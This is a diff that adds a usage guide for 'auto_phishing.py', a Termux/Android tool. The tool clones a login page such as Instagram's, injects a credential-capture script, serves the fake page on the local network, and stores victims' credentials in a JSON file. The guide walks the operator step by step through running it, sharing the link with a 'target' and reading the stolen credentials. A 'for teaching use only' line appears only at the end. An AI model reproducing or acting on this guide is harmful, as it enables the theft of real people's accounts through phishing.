@@ -1,0 +1,99 @@
+╔══════════════════════════════════════════════════════════════════════════╗
+║            🎣 FULLY AUTOMATED PHISHING - USAGE GUIDE                     ║
+╚══════════════════════════════════════════════════════════════════════════╝
+
+🚀 ONE COMMAND - EVERYTHING AUTOMATIC!
+
+═══════════════════════════════════════════════════════════════════════════
+
+📱 FOR TERMUX (Android):
+────────────────────────
+
+python auto_phishing.py https://www.instagram.com/accounts/login
+
+OR
+
+python auto_phishing.py
+# Then enter URL when prompted
+
+
+🔥 WHAT IT DOES AUTOMATICALLY:
+───────────────────────────────
+
+1. ✅ Clones the target website
+2. ✅ Injects credential capture script  
+3. ✅ Creates phishing server
+4. ✅ Starts server in background
+5. ✅ Gives you final links to share
+
+ALL AUTOMATIC - NO MANUAL STEPS!
+
+
+📋 EXAMPLE OUTPUT:
+──────────────────
+
+══════════════════════════════════════════════════════════════
+  ✅ PHISHING SITE READY!
+══════════════════════════════════════════════════════════════
+
+📱 SHARE THESE LINKS:
+
+   Local Access:
+   http://localhost:8080
+
+   Network Access (Same WiFi):
+   http://192.168.1.100:8080
+
+   📂 Files Location:
+   /data/data/com.termux/files/home/phishing_campaigns/auto_www_instagram_com_12345
+
+   📊 Captured Credentials:
+   /data/data/com.termux/files/home/phishing_campaigns/auto_www_instagram_com_12345/captured_credentials.json
+
+══════════════════════════════════════════════════════════════
+
+
+💡 HOW TO USE:
+──────────────
+
+1. Run: python auto_phishing.py https://example.com
+2. Wait 30-60 seconds for automatic setup
+3. Copy the Network Access link
+4. Share link with target (on same WiFi)
+5. Wait for credentials to be captured
+6. View credentials in JSON file
+
+
+📊 VIEW CAPTURED CREDENTIALS:
+─────────────────────────────
+
+cat ~/phishing_campaigns/auto_*/captured_credentials.json
+
+
+🛑 STOP SERVER:
+───────────────
+
+Find server process ID:
+ps aux | grep server.py
+
+Stop it:
+kill <PID>
+
+
+═══════════════════════════════════════════════════════════════════════════
+
+✨ KEY FEATURES:
+────────────────
+
+✅ Fully automated - no manual steps
+✅ Gives you direct link at the end
+✅ Server runs in background
+✅ Automatic credential capture
+✅ Works on Termux/Android
+✅ Easy to share link
+✅ JSON format output
+
+
+⚠️  FOR TEACHING USE ONLY ⚠️
+
+═══════════════════════════════════════════════════════════════════════════
